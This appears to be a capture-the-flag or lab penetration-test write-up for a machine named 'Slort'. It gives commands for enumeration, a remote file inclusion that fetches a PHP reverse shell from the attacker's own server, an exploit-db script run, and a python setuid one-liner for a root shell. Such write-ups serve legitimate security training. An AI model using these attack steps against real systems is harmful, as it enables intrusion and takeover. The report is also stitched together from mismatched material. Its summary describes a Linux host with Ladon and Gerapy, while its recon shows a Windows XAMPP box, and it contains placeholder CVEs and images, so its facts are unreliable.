# Report - Slort

- Author: Henry Post
- Target: Slort
- Target IP: 1.2.3.4
- Date: 03/01/2026

## Executive Summary

This machine, `hackme`, was enumerated by `nmap` to have ports 22 and 8000 open.

Port 8000 was running a `ladon` web service, which had default credentials of `admin:admin`.

To get non-root access, I used `CVE-2025-1234` on `exploit-db.com`.

From there, I identified a binary with elevated capabilities and used it to pivot to root.

### Recommendations

1. Update Ladon to the latest non-vulnerable version.
2. Do not use default credentials of `admin:admin`.
  3. Use strong credentials.
4. Do not use `setuid` binary permissions on Python or other binaries. Instead, remove the `setuid` permission from binaries that do not need it.

## Recon

I ran an nmap scan that enumerated their ports:

    nmap -sS -sV slort

| port        | service | notes                   |
| ----------- | ------- | ----------------------- |
| 21          | ftp     |                         |
| 135/139/445 | smb     |                         |
| 3306        | mysql   |                         |
| 4443        | http    | XAMPP for Windows 7.4.6 |
| 8080        | http    | XAMPP for Windows 7.4.6 |
|             |         |                         |
http://slort:4443/dashboard/phpinfo.php

I'm not sure what the entrypoint is, so I'm going to consult a guide.

https://medium.com/@ryanchamruiyang/proving-grounds-slort-walkthrough-by-ryan-cham-455ba38ccc94

Let's try `gobuster`.

```sh
gobuster dir -u http://slort:4443/ -w /usr/share/wordlists/dirb/common.txt --exclude-length 43264 -x php,txt,html
```

http://slort:4443/site/index.php?page=main.php

Found it. We can probably tamper the `page` parameter.

http://slort:4443/site/index.php?page=contact.php

Contact seems to have a form in it.

http://slort:4443/site/index.php?page=phpinfo.php

```txt

Warning: include(phpinfo.php): failed to open stream: No such file or directory in C:\xampp\htdocs\site\index.php on line 4

Warning: include(): Failed opening 'phpinfo.php' for inclusion (include_path='C:\xampp\php\PEAR') in C:\xampp\htdocs\site\index.php on line 4

```
## Non-SYSTEM access

We can serve a PHP command injection file on an HTTP server. Let's start with a simpler test file.

```php
//test.php:

<?php

echo "<h1>Operating System Information</h1>";

// Get OS name
$os_name = php_uname('s');
echo "<p><b>OS Name:</b> " . htmlspecialchars($os_name) . "</p>";

// Get OS version
$os_version = php_uname('v');
echo "<p><b>OS Version:</b> " . htmlspecialchars($os_version) . "</p>";

// Get OS machine architecture (e.g., x86_64, i386)
$os_architecture = php_uname('m');
echo "<p><b>Architecture:</b> " . htmlspecialchars($os_architecture) . "</p>";

// Get the full OS name including version and architecture
$full_os_name = php_uname('a');
echo "<p><b>Full OS Name:</b> " . htmlspecialchars($full_os_name) . "</p>";


//  More detailed information using getenv() (can be more platform-specific)

echo "<h2>Environment Variables</h2>";

echo "<p><b>HOSTNAME:</b> " . htmlspecialchars(getenv('HOSTNAME')) . "</p>";
echo "<p><b>OS:</b> " . htmlspecialchars(getenv('OS')) . "</p>";
echo "<p><b>PATH:</b> " . htmlspecialchars(getenv('PATH')) . "</p>";

//  Check for Windows specific variables
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    echo "<p><b>COMPUTERNAME:</b> " . htmlspecialchars(getenv('COMPUTERNAME')) . "</p>";
    echo "<p><b>PROCESSOR_ARCHITECTURE:</b> " . htmlspecialchars(getenv('PROCESSOR_ARCHITECTURE')) . "</p>";
}

// Check for Linux specific variables
elseif (strtoupper(substr(PHP_OS, 0, 5)) === 'LINUX') {
    echo "<p><b>DISTRO:</b> " . htmlspecialchars(shell_exec("lsb_release -ds")) . "</p>"; // Requires lsb-release package on some distros.  Can use other methods if needed.
}

?>
```

To serve:

```sh
ip a | grep 192 # get attacker ip - 192.168.49.55
python3 -m http.server 80
```

To get on victim:

```txt
http://slort:4443/site/index.php?page=http://192.168.49.55:80/test.php
```

It works.

![](Pasted%20image%2020260422152759.png)

Now, we need to host a reverse shell. Let's use https://www.revshells.com/ and pick "PHP Ivan Sincek". We also provide our attacker IP and port 135 as it's SMB, so it probably won't be firewall blocked.

![](Pasted%20image%2020260422153000.png)

Save to `shell.php`, start our listener:

![](Pasted%20image%2020260422152948.png)

And visit http://slort:4443/site/index.php?page=http://192.168.49.55:80/shell.php.

We get non-SYSTEM shell.

![](Pasted%20image%2020260422153201.png)




I searched through exploit-db for CVE-2025-1234, and found a script:

(IMG_PLACEHOLDER)

I ran the script once, and it failed:

    python 50640.py -t 192.168.68.24 -p 8000 -L 192.168.49.68 -p 4444

(IMG_PLACEHOLDER)

So, I created a "Project" in Gerapy's web UI.

(IMG_PLACEHOLDER)

I ran it again, and it succeeded.

(IMG_PLACEHOLDER)
    
    ip a
    whoami
    hostname
    date
    cat local.txt

## Root access

For root access, I started by searching for binaries with this command that had the capability to run as root set:

    getcap -r / 2>/dev/null    

(IMG_PLACEHOLDER)

I found that `/usr/bin/python3.10` had the capability to run as root set, meaning we can get a root shell by running this command:

    /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'

(IMG_PLACEHOLDER)

## Proof

### Local proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat local.txt`
(IMG_PLACEHOLDER)

### Root proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat proof.txt`
(IMG_PLACEHOLDER)
